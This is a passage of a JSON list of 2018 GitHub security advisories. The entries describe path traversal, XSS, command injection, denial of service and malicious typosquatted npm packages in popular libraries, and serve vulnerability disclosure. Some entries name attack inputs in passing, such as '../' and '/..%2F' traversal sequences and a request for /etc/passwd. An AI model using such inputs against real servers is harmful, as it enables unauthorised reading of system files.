    "publishedAt": "2018-10-04T20:29:55Z",
    "description": "An issue was discovered in Pivotal Spring Framework before 3.2.18, 4.2.x before 4.2.9, and 4.3.x before 4.3.5. Paths provided to the ResourceServlet were not properly sanitized and as a result exposed to directory traversal attacks.",
    "summary": "Moderate severity vulnerability that affects org.springframework:spring-core"
  },
  {
    "ghsaId": "GHSA-89gc-6cw6-4vch",
    "publishedAt": "2018-10-04T19:53:35Z",
    "description": "Directory traversal vulnerability in Spark 2.5 allows remote attackers to read arbitrary files via a .. (dot dot) in the URI.",
    "summary": "Moderate severity vulnerability that affects com.sparkjava:spark-core"
  },
  {
    "ghsaId": "GHSA-rf4j-j272-fj86",
    "publishedAt": "2018-10-03T21:13:54Z",
    "description": "django.contrib.auth.forms.AuthenticationForm in Django 2.0 before 2.0.2, and 1.11.8 and 1.11.9, allows remote attackers to obtain potentially sensitive information by leveraging data exposure from the confirm_login_allowed() method, as demonstrated by discovering whether a user account is inactive.",
    "summary": "Moderate severity vulnerability that affects django"
  },
  {
    "ghsaId": "GHSA-646x-m363-9rh4",
    "publishedAt": "2018-10-03T20:27:55Z",
    "description": "node-opensl was a malicious module published with the intent to hijack environment variables. It has been unpublished by npm.",
    "summary": "Moderate severity vulnerability that affects node-opensl"
  },
  {
    "ghsaId": "GHSA-6mx3-3vqg-hpp2",
    "publishedAt": "2018-10-03T20:07:39Z",
    "description": "An issue was discovered in Django 2.1 before 2.1.2, in which unprivileged users can read the password hashes of arbitrary accounts. The read-only password widget used by the Django Admin to display an obfuscated password hash was bypassed if a user has only the \"view\" permission (new in Django 2.1), resulting in display of the entire password hash to those users. This may result in a vulnerability for sites with legacy user accounts using insecure hashes.",
    "summary": "High severity vulnerability that affects django"
  },
  {
    "ghsaId": "GHSA-qfh2-6f7q-gr86",
    "publishedAt": "2018-10-01T16:30:38Z",
    "description": "XSS in sexstatic <=0.6.2 causes HTML injection in directory name(s) leads to Stored XSS when malicious file is embed with <iframe> element used in directory name.",
    "summary": "Moderate severity vulnerability that affects sexstatic"
  },
  {
    "ghsaId": "GHSA-4xjh-m3qx-49wc",
    "publishedAt": "2018-09-28T19:29:07Z",
    "description": "Jekyll through 3.6.2, 3.7.x through 3.7.3, and 3.8.x through 3.8.3 allows attackers to access arbitrary files by specifying a symlink in the \"include\" key in the \"_config.yml\" file.",
    "summary": "Moderate severity vulnerability that affects jekyll"
  },
  {
    "ghsaId": "GHSA-7375-vjr2-3g7w",
    "publishedAt": "2018-09-27T11:37:19Z",
    "description": "There is a Stored XSS vulnerability in the glance node module versions <= 3.0.5. File name, which contains malicious HTML (eg. embedded iframe element or javascript: pseudo-protocol handler in <a> element) allows to execute JavaScript code against any user who opens a directory listing containing such crafted file name.",
    "summary": "Moderate severity vulnerability that affects glance"
  },
  {
    "ghsaId": "GHSA-4wch-fwmx-cf47",
    "publishedAt": "2018-09-18T13:50:25Z",
    "description": "augustine node module suffers from a Path Traversal vulnerability due to lack of validation of url, which allows a malicious user to read content of any file with known path.",
    "summary": "Moderate severity vulnerability that affects augustine"
  },
  {
    "ghsaId": "GHSA-c2vr-2c89-ph88",
    "publishedAt": "2018-09-18T13:49:54Z",
    "description": "node-bsdiff-android downloads resources over HTTP, which leaves it vulnerable to MITM attacks.",
    "summary": "Moderate severity vulnerability that affects node-bsdiff-android"
  },
  {
    "ghsaId": "GHSA-hxhm-3vj9-6cqh",
    "publishedAt": "2018-09-18T13:49:31Z",
    "description": "apk-parser2 is a module which extracts Android Manifest info from an APK file. apk-parser2 downloads binary resources over HTTP, which leaves it vulnerable to MITM attacks. It may be possible to cause remote code execution (RCE) by swapping out the requested binary with an attacker controlled binary if the attacker is on the network or positioned in between the user and the remote server.",
    "summary": "High severity vulnerability that affects apk-parser2"
  },
  {
    "ghsaId": "GHSA-m8cr-q935-8j67",
    "publishedAt": "2018-09-18T13:47:57Z",
    "description": "Path traversal in buttle module versions <= 0.2.0 allows to read any file in the server.",
    "summary": "Moderate severity vulnerability that affects buttle"
  },
  {
    "ghsaId": "GHSA-fp82-2h99-3fpp",
    "publishedAt": "2018-09-18T13:47:24Z",
    "description": "The utilities function in all versions of the merge-object node module can be tricked into modifying the prototype of Object when the attacker can control part of the structure passed to this function. This can let an attacker add or modify existing properties that will exist on all objects.",
    "summary": "High severity vulnerability that affects merge-object"
  },
  {
    "ghsaId": "GHSA-cvxm-f295-x957",
    "publishedAt": "2018-09-18T13:46:06Z",
    "description": "The utilities function in all of the merge-recursive node module can be tricked into modifying the prototype of Object when the attacker can control part of the structure passed to this function. This can let an attacker add or modify existing properties that will exist on all objects.",
    "summary": "High severity vulnerability that affects merge-recursive"
  },
  {
    "ghsaId": "GHSA-fm87-46vv-jqrr",
    "publishedAt": "2018-09-18T13:45:07Z",
    "description": "The html-pages node module contains a path traversal vulnerabilities that allows an attacker to read any file from the server with cURL.",
    "summary": "Moderate severity vulnerability that affects html-pages"
  },
  {
    "ghsaId": "GHSA-77pc-q5q7-qg9h",
    "publishedAt": "2018-09-17T21:58:30Z",
    "description": "Withdrawn, accidental duplicate publish.\r\n\r\nCross-site scripting (XSS) vulnerability in lib/rails/html/scrubbers.rb in the rails-html-sanitizer gem before 1.0.3 for Ruby on Rails 4.2.x and 5.x allows remote attackers to inject arbitrary web script or HTML via a crafted CDATA node.",
    "summary": "Moderate severity vulnerability that affects rails-html-sanitizer"
  },
  {
    "ghsaId": "GHSA-mrhj-2g4v-39qx",
    "publishedAt": "2018-09-17T21:58:19Z",
    "description": "Withdrawn, accidental duplicate publish.\r\n\r\nCross-site scripting (XSS) vulnerability in the rails-html-sanitizer gem 1.0.2 for Ruby on Rails 4.2.x and 5.x allows remote attackers to inject arbitrary web script or HTML via an HTML entity that is mishandled by the Rails::Html::FullSanitizer class.",
    "summary": "Moderate severity vulnerability that affects rails-html-sanitizer"
  },
  {
    "ghsaId": "GHSA-7phj-gmgx-2r66",
    "publishedAt": "2018-09-17T21:58:09Z",
    "description": "Withdrawn, accidental duplicate publish.\r\n\r\nactiverecord/lib/active_record/nested_attributes.rb in Active Record in Ruby on Rails 3.1.x and 3.2.x before 3.2.22.1, 4.0.x and 4.1.x before 4.1.14.1, 4.2.x before 4.2.5.1, and 5.x before 5.0.0.beta1.1 does not properly implement a certain destroy option, which allows remote attackers to bypass intended change restrictions by leveraging use of the nested attributes feature.",
    "summary": "Moderate severity vulnerability that affects activerecord"
  },
  {
    "ghsaId": "GHSA-qc8j-m8j3-rjq6",
    "publishedAt": "2018-09-17T21:57:58Z",
    "description": "Withdrawn, accidental duplicate publish.\r\n\r\nCross-site scripting (XSS) vulnerability in the rails-html-sanitizer gem before 1.0.3 for Ruby on Rails 4.2.x and 5.x allows remote attackers to inject arbitrary web script or HTML via crafted tag attributes.",
    "summary": "Moderate severity vulnerability that affects rails-html-sanitizer"
  },
  {
    "ghsaId": "GHSA-vwfg-qj3r-6v3r",
    "publishedAt": "2018-09-17T21:57:47Z",
    "description": "Withdrawn, accidental duplicate publish.\r\n\r\nThe http_basic_authenticate_with method in actionpack/lib/action_controller/metal/http_authentication.rb in the Basic Authentication implementation in Action Controller in Ruby on Rails before 3.2.22.1, 4.0.x and 4.1.x before 4.1.14.1, 4.2.x before 4.2.5.1, and 5.x before 5.0.0.beta1.1 does not use a constant-time algorithm for verifying credentials, which makes it easier for remote attackers to bypass authentication by measuring timing differences.",
    "summary": "Moderate severity vulnerability that affects actionpack"
  },
  {
    "ghsaId": "GHSA-jxjr-5h69-qw3w",
    "publishedAt": "2018-09-17T21:57:38Z",
    "description": "Heap-based buffer overflow in the xmlGROW function in parser.c in libxml2 before 2.9.3 allows context-dependent attackers to obtain sensitive process memory information via unspecified vectors.",
    "summary": "Moderate severity vulnerability that affects nokogiri"
  },
  {
    "ghsaId": "GHSA-35c4-f3rq-f9g3",
    "publishedAt": "2018-09-17T21:57:23Z",
    "description": "Withdrawn, accidental duplicate publish.\r\n\r\nThe (1) jdom.rb and (2) rexml.rb components in Active Support in Ruby on Rails before 4.1.11 and 4.2.x before 4.2.2, when JDOM or REXML is enabled, allow remote attackers to cause a denial of service (SystemStackError) via a large XML document depth.",
    "summary": "Moderate severity vulnerability that affects activesupport"
  },
  {
    "ghsaId": "GHSA-9vc2-p34x-jhxh",
    "publishedAt": "2018-09-17T21:56:30Z",
    "description": "Withdrawn, accidental duplicate publish.\r\n\r\nlib/rack/utils.rb in Rack before 1.5.4 and 1.6.x before 1.6.2, as used with Ruby on Rails 3.x and 4.x and other products, allows remote attackers to cause a denial of service (SystemStackError) via a request with a large parameter depth.",
    "summary": "Moderate severity vulnerability that affects rack"
  },
  {
    "ghsaId": "GHSA-6834-r92f-jj42",
    "publishedAt": "2018-09-17T21:55:54Z",
    "description": "Withdrawn, accidental duplicate publish.\r\n\r\nDirectory traversal vulnerability in Action View in Ruby on Rails before 3.2.22.1, 4.0.x and 4.1.x before 4.1.14.1, 4.2.x before 4.2.5.1, and 5.x before 5.0.0.beta1.1 allows remote attackers to read arbitrary files by leveraging an application's unrestricted use of the render method and providing a .. (dot dot) in a pathname.",
    "summary": "Moderate severity vulnerability that affects actionview"
  },
  {
    "ghsaId": "GHSA-v543-gqhh-6gww",
    "publishedAt": "2018-09-17T21:55:43Z",
    "description": "Withdrawn, accidental duplicate publish.\r\n\r\nActive Model in Ruby on Rails 4.1.x before 4.1.14.1, 4.2.x before 4.2.5.1, and 5.x before 5.0.0.beta1.1 supports the use of instance-level writers for class accessors, which allows remote attackers to bypass intended validation steps via crafted parameters.",
    "summary": "Moderate severity vulnerability that affects activemodel"
  },
  {
    "ghsaId": "GHSA-685w-vc84-wxcx",
    "publishedAt": "2018-09-17T21:55:22Z",
    "description": "Cross-site request forgery (CSRF) vulnerability in doorkeeper before 1.4.1 allows remote attackers to hijack the authentication of unspecified victims for requests that read a user OAuth authorization code via unknown vectors.",
    "summary": "Moderate severity vulnerability that affects doorkeeper"
  },
  {
    "ghsaId": "GHSA-m53f-rhq8-q6hf",
    "publishedAt": "2018-09-17T21:55:03Z",
    "description": "Withdrawn, accidental duplicate publish.\r\n\r\nactionpack/lib/action_dispatch/http/mime_type.rb in Action Pack in Ruby on Rails before 3.2.22.1, 4.0.x and 4.1.x before 4.1.14.1, 4.2.x before 4.2.5.1, and 5.x before 5.0.0.beta1.1 does not properly restrict use of the MIME type cache, which allows remote attackers to cause a denial of service (memory consumption) via a crafted HTTP Accept header.",
    "summary": "Moderate severity vulnerability that affects actionpack"
  },
  {
    "ghsaId": "GHSA-5xmj-wm96-fmw8",
    "publishedAt": "2018-09-17T21:54:37Z",
    "description": "Withdrawn, accidental duplicate publish.\r\n\r\nDirectory traversal vulnerability in actionpack/lib/action_dispatch/middleware/static.rb in Action Pack in Ruby on Rails 3.x before 3.2.21, 4.0.x before 4.0.12, 4.1.x before 4.1.8, and 4.2.x before 4.2.0.beta4, when serve_static_assets is enabled, allows remote attackers to determine the existence of files outside the application root via vectors involving a \\ (backslash) character, a similar issue to CVE-2014-7818.",
    "summary": "Moderate severity vulnerability that affects actionpack"
  },
  {
    "ghsaId": "GHSA-23v3-qfrj-wmgh",
    "publishedAt": "2018-09-17T21:54:22Z",
    "description": "Withdrawn, accidental duplicate publish.\r\n\r\nDirectory traversal vulnerability in actionpack/lib/action_dispatch/middleware/static.rb in Action Pack in Ruby on Rails 3.x before 3.2.20, 4.0.x before 4.0.11, 4.1.x before 4.1.7, and 4.2.x before 4.2.0.beta3, when serve_static_assets is enabled, allows remote attackers to determine the existence of files outside the application root via a /..%2F sequence.",
    "summary": "Moderate severity vulnerability that affects actionpack"
  },
  {
    "ghsaId": "GHSA-qf5x-qgx7-437h",
    "publishedAt": "2018-09-17T21:54:11Z",
    "description": "Withdrawn, accidental duplicate publish.\r\n\r\nDirectory traversal vulnerability in actionpack/lib/abstract_controller/base.rb in the implicit-render implementation in Ruby on Rails before 3.2.18, 4.0.x before 4.0.5, and 4.1.x before 4.1.1, when certain route globbing configurations are enabled, allows remote attackers to read arbitrary files via a crafted request.",
    "summary": "Moderate severity vulnerability that affects actionpack"
  },
  {
    "ghsaId": "GHSA-7hp2-xwpj-95jq",
    "publishedAt": "2018-09-17T21:53:42Z",
    "description": "dict.c in libxml2 allows remote attackers to cause a denial of service (heap-based buffer over-read and application crash) via an unexpected character immediately after the \"<!DOCTYPE html\" substring in a crafted HTML document.",
    "summary": "Moderate severity vulnerability that affects nokogiri"
  },
  {
    "ghsaId": "GHSA-544j-77x9-h938",
    "publishedAt": "2018-09-17T21:53:30Z",
    "description": "Withdrawn, accidental duplicate publish.\r\n\r\nactionpack/lib/action_dispatch/routing/route_set.rb in Action Pack in Ruby on Rails 4.x before 4.2.5.1 and 5.x before 5.0.0.beta1.1 allows remote attackers to cause a denial of service (superfluous caching and memory consumption) by leveraging an application's use of a wildcard controller route.",
    "summary": "Moderate severity vulnerability that affects actionpack"
  },
  {
    "ghsaId": "GHSA-6g87-ff9q-v847",
    "publishedAt": "2018-09-17T20:46:52Z",
    "description": "The Python websockets library version 4 contains a CWE-409: Improper Handling of Highly Compressed Data (Data Amplification) vulnerability in Servers and clients, unless configured with compression=None that can result in Denial of Service by memory exhaustion. This attack appear to be exploitable via Sending a specially crafted frame on an established connection. This vulnerability appears to have been fixed in 5.",
    "summary": "High severity vulnerability that affects websockets"
  },
  {
    "ghsaId": "GHSA-8462-q7x7-g2x4",
    "publishedAt": "2018-09-17T20:44:58Z",
    "description": "The MongoDB bson JavaScript module (also known as js-bson) versions 0.5.0 to 1.0.x before 1.0.5 is vulnerable to a Regular Expression Denial of Service (ReDoS) in lib/bson/decimal128.js. The flaw is triggered when the Decimal128.fromString() function is called to parse a long untrusted string.",
    "summary": "High severity vulnerability that affects bson"
  },
  {
    "ghsaId": "GHSA-cfhg-9x44-78h2",
    "publishedAt": "2018-09-17T20:43:59Z",
    "description": "A command Injection in ps package versions <1.0.0 for Node.js allowed arbitrary commands to be executed when attacker controls the PID.",
    "summary": "High severity vulnerability that affects ps"
  },
  {
    "ghsaId": "GHSA-c9j3-wqph-5xx9",
    "publishedAt": "2018-09-17T20:43:34Z",
    "description": "A command injection vulnerability in egg-scripts <v2.8.1 allows arbitrary shell command execution through a maliciously crafted command line argument.",
    "summary": "High severity vulnerability that affects egg-scripts"
  },
  {
    "ghsaId": "GHSA-5cv7-r488-wc5x",
    "publishedAt": "2018-09-17T20:39:17Z",
    "description": "noderequest was a malicious module published with the intent to hijack environment variables. It has been unpublished by npm.",
    "summary": "Moderate severity vulnerability that affects noderequest"
  },
  {
    "ghsaId": "GHSA-7mvr-5x2g-wfc8",
    "publishedAt": "2018-09-13T15:50:32Z",
    "description": "In Bootstrap before 4.1.2, XSS is possible in the data-container property of tooltip.  This is similar to CVE-2018-14041.",
    "summary": "Moderate severity vulnerability that affects bootstrap"
  },
  {
    "ghsaId": "GHSA-pj7m-g53m-7638",
    "publishedAt": "2018-09-13T15:49:56Z",
    "description": "In Bootstrap before 4.1.2, XSS is possible in the data-target property of scrollspy. This is similar to CVE-2018-14042.",
    "summary": "Moderate severity vulnerability that affects bootstrap"
  },
  {
    "ghsaId": "GHSA-m4fw-77v7-924m",
    "publishedAt": "2018-09-13T15:47:57Z",
    "description": "qutebrowser version introduced in v0.11.0 (1179ee7a937fb31414d77d9970bac21095358449) contains a Cross Site Scripting (XSS) vulnerability in history command, qute://history page that can result in Via injected JavaScript code, a website can steal the user's browsing history. This attack appear to be exploitable via the victim must open a page with a specially crafted <title> attribute, and then open the qute://history site via the :history command. This vulnerability appears to have been fixed in fixed in v1.3.3 (4c9360237f186681b1e3f2a0f30c45161cf405c7, to be released today) and v1.4.0 (5a7869f2feaa346853d2a85413d6527c87ef0d9f, released later this week).",
    "summary": "Moderate severity vulnerability that affects qutebrowser"
  },
  {
    "ghsaId": "GHSA-h6h9-pphv-m266",
    "publishedAt": "2018-09-13T15:47:26Z",
    "description": "topydo contains a CWE-20: Improper Input Validation vulnerability in ListFormatParser::parse, file topydo/lib/ListFormat.py line 292 as of d4f843dac71308b2f29a7c2cdc76f055c3841523 that can result in Injection of arbitrary bytes to the terminal, including terminal escape code sequences. This attack appear to be exploitable via The victim must open a todo.txt with at least one specially crafted line..",
    "summary": "Low severity vulnerability that affects topydo"
  },
  {
    "ghsaId": "GHSA-fpwp-69xv-c67f",
    "publishedAt": "2018-09-13T15:46:40Z",
    "description": "The pypi package aiohttp-session before 2.4.0 contained a Session Fixation vulnerability in load_session function for RedisStorage  that can result in Session Hijacking. This attack appear to be exploitable via Any method that allows setting session cookies (?session=<>, or meta tags or script tags with Set-Cookie).\r\n",
    "summary": "Moderate severity vulnerability that affects aiohttp-session"
  },
  {
    "ghsaId": "GHSA-2j2j-8rrv-264g",
    "publishedAt": "2018-09-11T18:58:40Z",
    "description": "An unescaped payload in exceljs <v1.6 allows a possible XSS via cell value when worksheet is displayed in browser.",
    "summary": "Moderate severity vulnerability that affects exceljs"
  },
  {
    "ghsaId": "GHSA-xqvg-xm9m-p2c4",
    "publishedAt": "2018-09-11T18:57:16Z",
    "description": "An issue was discovered in GNU Mailman before 2.1.28. A crafted URL can cause arbitrary text to be displayed on a web page from a trusted site.",
    "summary": "Moderate severity vulnerability that affects mailman"
  },
  {
    "ghsaId": "GHSA-rq8g-5pc5-wrhr",
    "publishedAt": "2018-09-11T18:22:50Z",
    "description": "The NPM package cryptiles version 4.1.1 and earlier contains a CWE-331: Insufficient Entropy vulnerability in randomDigits() method that can result in An attacker is more likely to be able to brute force something that was supposed to be random.. This attack appear to be exploitable via Depends upon the calling application.. This vulnerability appears to have been fixed in 4.1.2.",
    "summary": "High severity vulnerability that affects cryptiles"
  },
  {
    "ghsaId": "GHSA-9mr8-6prp-gwjv",
    "publishedAt": "2018-09-10T15:20:30Z",
    "description": "Node.js third-party module query-mysql versions 0.0.0, 0.0.1, and 0.0.2 are vulnerable to an SQL injection vulnerability due to lack of user input sanitization. This may allow an attacker to run arbitrary SQL queries when fetching data from database.",
    "summary": "High severity vulnerability that affects query-mysql"
  },
  {
    "ghsaId": "GHSA-qg3g-2mgh-33j8",
    "publishedAt": "2018-09-10T15:19:49Z",
    "description": "A Security Feature Bypass vulnerability exists in MSR JavaScript Cryptography Library that is caused by incorrect arithmetic computations, aka \"MSR JavaScript Cryptography Library Security Feature Bypass Vulnerability.\" This affects Microsoft Research JavaScript Cryptography Library.",
    "summary": "Critical severity vulnerability that affects msrcrypto"
  },
  {
    "ghsaId": "GHSA-pp57-mqmh-44h7",
    "publishedAt": "2018-09-06T23:24:21Z",
    "description": "The macaddress module before 0.2.9 for Node.js is prone to an arbitrary command injection flaw, due to allowing unsanitized input to an exec (rather than execFile) call.",
    "summary": "Command Injection in macaddress"
  },
  {
    "ghsaId": "GHSA-w578-j992-554x",
    "publishedAt": "2018-09-06T03:28:50Z",
    "description": "Ansible before versions 2.3.1.0 and 2.4.0.0 fails to properly mark lookup-plugin results as unsafe. If an attacker could control the results of lookup() calls, they could inject Unicode strings to be parsed by the jinja2 templating system, resulting in code execution. By default, the jinja2 templating language is now marked as 'unsafe' and is not evaluated.",
    "summary": "Moderate severity vulnerability that affects ansible"
  },
  {
    "ghsaId": "GHSA-vqcq-mrmw-mcmg",
    "publishedAt": "2018-09-06T03:27:18Z",
    "description": "rubyzip gem rubyzip version 1.2.1 and earlier contains a Directory Traversal vulnerability in Zip::File component that can result in write arbitrary files to the filesystem. This attack appear to be exploitable via If a site allows uploading of .zip files , an attacker can upload a malicious file that contains symlinks or files with absolute pathnames \"../\" to write arbitrary files to the filesystem..\r\n\r\nThis is similar to CVE-2017-5946 which was patched in 1.2.1 but the fix in that case was incomplete.\r\n",
    "summary": "Moderate severity vulnerability that affects rubyzip"
  },
  {
    "ghsaId": "GHSA-5h6m-9mvx-m6c5",
    "publishedAt": "2018-09-06T03:25:03Z",
    "description": "An issue was discovered in Mayan EDMS before 3.0.3. The Tags app has XSS because tag label values are mishandled.",
    "summary": "Moderate severity vulnerability that affects mayan-edms"
  },
  {
    "ghsaId": "GHSA-5r76-cjf4-c9qx",
    "publishedAt": "2018-09-06T03:24:57Z",
    "description": "An issue was discovered in Mayan EDMS before 3.0.2. The Cabinets app has XSS via a crafted cabinet label.",
    "summary": "Moderate severity vulnerability that affects mayan-edms"
  },
  {
    "ghsaId": "GHSA-fpcv-j2q9-vqhw",
    "publishedAt": "2018-09-06T03:24:50Z",
    "description": "An issue was discovered in Mayan EDMS before 3.0.2. The Appearance app sets window.location directly, leading to XSS.",
    "summary": "Moderate severity vulnerability that affects mayan-edms"
  },
  {
    "ghsaId": "GHSA-gpvj-q7fp-jcch",
    "publishedAt": "2018-09-06T03:22:59Z",
    "description": "Path traversal in simplehttpserver <v0.2.1 allows listing any file on the server.",
    "summary": "Moderate severity vulnerability that affects simplehttpserver"
  },
  {
    "ghsaId": "GHSA-vjcj-5g2r-vxqc",
    "publishedAt": "2018-09-06T03:22:00Z",
    "description": "Pandao Editor.md 1.5.0 allows XSS via crafted attributes of an invalid IMG element.",
    "summary": "Moderate severity vulnerability that affects editor.md"
  },
  {
    "ghsaId": "GHSA-2gw2-8q9w-cw8p",
    "publishedAt": "2018-08-31T14:55:43Z",
    "description": "ruby-ffi version 1.9.23 and earlier has a DLL loading issue which can be hijacked on Windows OS, when a Symbol is used as DLL name instead of a String This vulnerability appears to have been fixed in v1.9.24 and later.",
    "summary": "Moderate severity vulnerability that affects ffi"
  },
  {
    "ghsaId": "GHSA-wqg7-vrj7-v82h",
    "publishedAt": "2018-08-31T06:22:50Z",
    "description": "This vulnerability allows remote attackers to deny service on vulnerable installations of npm mosca 2.8.1. Authentication is not required to exploit this vulnerability. The specific flaw exists within the processing of topics. A crafted regular expression can cause the broker to crash. An attacker can leverage this vulnerability to deny access to the target system.",
    "summary": "High severity vulnerability that affects mosca"
  },
  {
    "ghsaId": "GHSA-72hv-rp4q-q7f3",
    "publishedAt": "2018-08-29T23:57:14Z",
    "description": "babelcli was a malicious module published with the intent to hijack environment variables. It has been unpublished by npm.",
    "summary": "Moderate severity vulnerability that affects babelcli"
  },
  {
    "ghsaId": "GHSA-3wxq-7r8m-qpmg",
    "publishedAt": "2018-08-29T23:56:30Z",
    "description": "ffmepg was a malicious module published with the intent to hijack environment variables. It has been unpublished by npm.",
    "summary": "Moderate severity vulnerability that affects ffmepg"
  },
  {
    "ghsaId": "GHSA-4x37-5rh2-hp8c",
    "publishedAt": "2018-08-29T23:50:59Z",
    "description": "node-opencv was a malicious module published with the intent to hijack environment variables. It has been unpublished by npm.",
    "summary": "Moderate severity vulnerability that affects node-opencv"
  },
  {
    "ghsaId": "GHSA-5hxw-r847-qfwp",
    "publishedAt": "2018-08-29T23:47:07Z",
    "description": "opencv.js was a malicious module published with the intent to hijack environment variables. It has been unpublished by npm.",
    "summary": "Moderate severity vulnerability that affects opencv.js"
  },
  {
    "ghsaId": "GHSA-22gq-x6pg-752j",
    "publishedAt": "2018-08-29T23:45:41Z",
    "description": "openssl.js was a malicious module published with the intent to hijack environment variables. It has been unpublished by npm.",
    "summary": "Moderate severity vulnerability that affects openssl.js"
  },
  {
    "ghsaId": "GHSA-j866-8vxx-27hx",
    "publishedAt": "2018-08-29T23:43:53Z",
    "description": "nodemailer.js was a malicious module published with the intent to hijack environment variables. It has been unpublished by npm.",
    "summary": "Moderate severity vulnerability that affects nodemailer.js"
  },
  {
    "ghsaId": "GHSA-xh56-3f5w-9h25",
    "publishedAt": "2018-08-29T23:40:01Z",
    "description": "nodemailer-js was a malicious module published with the intent to hijack environment variables. It has been unpublished by npm.",
    "summary": "Moderate severity vulnerability that affects nodemailer-js"
  },
  {
    "ghsaId": "GHSA-2wpq-vvw6-67wr",
    "publishedAt": "2018-08-29T23:38:35Z",
    "description": "nodecaffe was a malicious module published with the intent to hijack environment variables. It has been unpublished by npm.",
    "summary": "Moderate severity vulnerability that affects nodecaffe"
  },
  {
    "ghsaId": "GHSA-wqh4-27cc-j8f2",
    "publishedAt": "2018-08-29T23:36:48Z",
    "description": "nodeffmpeg was a malicious module published with the intent to hijack environment variables. It has been unpublished by npm.",
    "summary": "Moderate severity vulnerability that affects nodeffmpeg"
  },
  {
    "ghsaId": "GHSA-8h55-49jm-739x",
    "publishedAt": "2018-08-29T23:21:46Z",
    "description": "easyquick is a simple web server. easyquick is vulnerable to a directory traversal issue, giving an attacker access to the filesystem by placing \"../\" in the url. Access is constrained, however, to supported file types. Requesting a file such as /etc/passwd returns a \"not supported\" error.",
    "summary": "Moderate severity vulnerability that affects easyquick"
  },
  {
    "ghsaId": "GHSA-vv6q-9cfw-4c83",
    "publishedAt": "2018-08-29T23:20:27Z",
    "description": "smb was a malicious module published with the intent to hijack environment variables. It has been unpublished by npm.",
    "summary": "Moderate severity vulnerability that affects smb"
  },
  {
    "ghsaId": "GHSA-qj73-v688-wqxf",
    "publishedAt": "2018-08-29T23:19:13Z",
    "description": "proxy.js was a malicious module published with the intent to hijack environment variables. It has been unpublished by npm.",
    "summary": "Moderate severity vulnerability that affects proxy.js"
  },
  {
    "ghsaId": "GHSA-4g54-95xv-f353",
    "publishedAt": "2018-08-29T23:16:56Z",
    "description": "http-proxy.js was a malicious module published with the intent to hijack environment variables. It has been unpublished by npm.",
    "summary": "Moderate severity vulnerability that affects http-proxy.js"
  },
  {
    "ghsaId": "GHSA-c2m4-w5hm-vqjw",
    "publishedAt": "2018-08-29T23:05:46Z",
    "description": "crossenv was a malicious module published with the intent to hijack environment variables. It has been unpublished by npm.",
    "summary": "Moderate severity vulnerability that affects crossenv"
  },
  {
    "ghsaId": "GHSA-f523-2f5j-gfcg",
    "publishedAt": "2018-08-29T23:04:14Z",
    "description": "The timespan module is vulnerable to regular expression denial of service. Given 50k characters of untrusted user input it will block the event loop for around 10 seconds.",
    "summary": "Low severity vulnerability that affects timespan"
  },
  {
    "ghsaId": "GHSA-mp78-r56v-45qc",
    "publishedAt": "2018-08-28T22:34:31Z",
    "description": "Cross-site scripting (XSS) vulnerability in Ember.js 1.10.x before 1.10.1 and 1.11.x before 1.11.2.",
    "summary": "Moderate severity vulnerability that affects ember-source"
  },
  {
    "ghsaId": "GHSA-2hxv-mx8x-mcj9",
    "publishedAt": "2018-08-28T22:34:22Z",
    "description": "Cross-site request forgery (CSRF) vulnerability in Spina before commit bfe44f289e336f80b6593032679300c493735e75.",
    "summary": "Moderate severity vulnerability that affects spina"
  },
  {
    "ghsaId": "GHSA-x489-jjwm-52g7",
    "publishedAt": "2018-08-28T22:34:15Z",
    "description": "Tinfoil Devise-two-factor before 2.0.0 does not strictly follow section 5.2 of RFC 6238 and does not \"burn\" a successfully validated one-time password (aka OTP), which allows remote or physically proximate attackers with a target user's login credentials to log in as said user by obtaining the OTP through performing a man-in-the-middle attack between the provider and verifier, or shoulder surfing, and replaying the OTP in the current time-step.",
    "summary": "Low severity vulnerability that affects devise-two-factor"
  },
  {
    "ghsaId": "GHSA-m2q3-53fq-7h66",
    "publishedAt": "2018-08-28T22:33:51Z",
    "description": "The Precious module in gollum before 4.0.1 allows remote attackers to read arbitrary files by leveraging the lack of a certain temporary-file check.",
    "summary": "Moderate severity vulnerability that affects gollum"
  },
  {
    "ghsaId": "GHSA-4q53-fqhc-cr46",
    "publishedAt": "2018-08-28T22:33:42Z",
    "description": "Cross-site scripting (XSS) vulnerability in the link-to helper in Ember.js 1.2.x before 1.2.2, 1.3.x before 1.3.2, and 1.4.x before 1.4.0-beta.6, when used in non-block form, allows remote attackers to inject arbitrary web script or HTML via the title attribute.",
    "summary": "Low severity vulnerability that affects ember-source"
  },
  {
    "ghsaId": "GHSA-m3q7-rj8g-m457",
    "publishedAt": "2018-08-28T22:33:24Z",
    "description": "Cross-site scripting (XSS) vulnerability in Ember.js 1.8.x through 1.10.x, 1.11.x before 1.11.4, 1.12.x before 1.12.2, 1.13.x before 1.13.12, 2.0.x before 2.0.3, 2.1.x before 2.1.2, and 2.2.x before 2.2.1 allows remote attackers to inject arbitrary web script or HTML.",
    "summary": "Moderate severity vulnerability that affects ember-source"
  },
  {
    "ghsaId": "GHSA-hgg3-g7gr-66r7",
    "publishedAt": "2018-08-27T19:52:28Z",
    "description": "PyCryptodome before 3.6.6 has an integer overflow in the data_len variable in AESNI.c, related to the AESNI_encrypt and AESNI_decrypt functions, leading to the mishandling of messages shorter than 16 bytes.",
    "summary": "High severity vulnerability that affects pycryptodome"
  },
  {
    "ghsaId": "GHSA-36vc-cw62-fqvr",
    "publishedAt": "2018-08-27T19:07:23Z",
    "description": "shadowsock was a malicious module published with the intent to hijack environment variables. It has been unpublished by npm.",
    "summary": "Moderate severity vulnerability that affects shadowsock"
  },
  {
    "ghsaId": "GHSA-hv9c-qwqg-qj3v",
    "publishedAt": "2018-08-23T19:12:08Z",
    "description": "GitHub Electron 1.7.15, 1.8.7, 2.0.7, and 3.0.0-beta.6, in certain scenarios involving IFRAME elements and \"nativeWindowOpen: true\" or \"sandbox: true\" options, is affected by a WebPreferences vulnerability that can be leveraged to perform remote code execution.",
    "summary": "High severity vulnerability that affects electron"
  },
  {
    "ghsaId": "GHSA-562c-5r94-xh97",
    "publishedAt": "2018-08-23T19:10:40Z",
    "description": "The Pallets Project flask version Before 0.12.3 contains a CWE-20: Improper Input Validation vulnerability in flask that can result in Large amount of memory usage possibly leading to denial of service. This attack appear to be exploitable via Attacker provides JSON data in incorrect encoding. This vulnerability appears to have been fixed in 0.12.3.",
    "summary": "Moderate severity vulnerability that affects flask"
  },
  {
    "ghsaId": "GHSA-fr52-4hqw-p27f",
    "publishedAt": "2018-08-21T19:03:26Z",
